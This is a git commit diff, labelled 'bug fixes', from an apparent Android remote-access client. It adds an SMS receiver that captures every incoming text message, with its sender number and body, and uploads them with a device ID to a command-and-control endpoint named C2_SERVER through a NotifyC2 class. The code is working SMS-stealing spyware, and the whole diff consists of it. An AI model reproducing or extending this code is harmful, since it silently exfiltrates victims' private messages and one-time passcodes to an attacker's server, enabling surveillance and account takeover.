a54da7997c05d3fae6a9e25dfa2fd55cb33d4a00
Olorunfemi-Ojo Tomiwa <ot.server1@outlook.com>
2024-02-20 14:01:06 +0100

    bug fixes

--- Client/app/src/main/java/com/ot/grhq/client/receivers/SMS.java
+++ Client/app/src/main/java/com/ot/grhq/client/receivers/SMS.java
@@ -1,2 +1,52 @@
-package com.ot.grhq.client.receivers;public class SMS {
+package com.ot.grhq.client.receivers;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Bundle;
+import android.telephony.SmsMessage;
+import android.util.Log;
+
+import com.ot.grhq.client.functionality.Utils;
+
+import org.json.JSONException;
+import org.json.JSONObject;
+
+/**
+ * SMS notification receiver
+ */
+public class SMS extends BroadcastReceiver {
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
+            Bundle bundle = intent.getExtras();
+            if (bundle != null) {
+                // Retrieve the SMS messages received.
+                Object[] pdus = (Object[]) bundle.get("pdus");
+
+                if (pdus != null) {
+                    for (Object pdu : pdus) {
+                        SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdu);
+
+                        String senderNumber = currentMessage.getDisplayOriginatingAddress();
+                        String messageBody = currentMessage.getDisplayMessageBody();
+
+                        if (!senderNumber.isEmpty() && !messageBody.isEmpty()) {
+                            String formData = "id=" + Utils.clientID(context);
+                            formData += "&type=client";
+                            formData += "&res=message";
+                            formData += "&sender=" + senderNumber;
+                            formData += "&content=" + messageBody;
+                            formData += "&timestamp=" + System.currentTimeMillis();
+                            new NotifyC2(Utils.C2_SERVER + "/uploadMessage", formData, result -> {
+
+                            }).execute();
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+
 }
